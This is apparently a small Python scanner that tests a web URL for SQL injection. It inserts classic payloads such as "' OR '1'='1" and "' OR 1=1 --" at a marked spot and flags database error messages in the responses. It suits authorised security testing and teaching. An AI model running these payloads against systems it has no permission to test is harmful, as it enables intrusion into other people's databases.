import requests
import argparse
from bs4 import BeautifulSoup

def check_sql_injection(url):
    payloads = ["'", "' OR '1'='1", "' OR '1'='1' --", "' OR 'a'='a", "' OR 1=1 --"]
    for payload in payloads:
        test_url = url.replace("INJECT_HERE", payload)
        response = requests.get(test_url)
        if is_vulnerable(response):
            print(f"Potential SQL Injection vulnerability found with payload: {payload}")
        else:
            print(f"No vulnerability found with payload: {payload}")

def is_vulnerable(response):
    error_signatures = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated"
    ]
    content = response.text.lower()
    for signature in error_signatures:
        if signature in content:
            return True
    return False

def main():
    parser = argparse.ArgumentParser(description="SQL Injection vulnerability scanner")
    parser.add_argument("url", help="URL to test for SQL Injection (use 'INJECT_HERE' for the injection point)")
    args = parser.parse_args()
    check_sql_injection(args.url)

if __name__ == "__main__":
    main()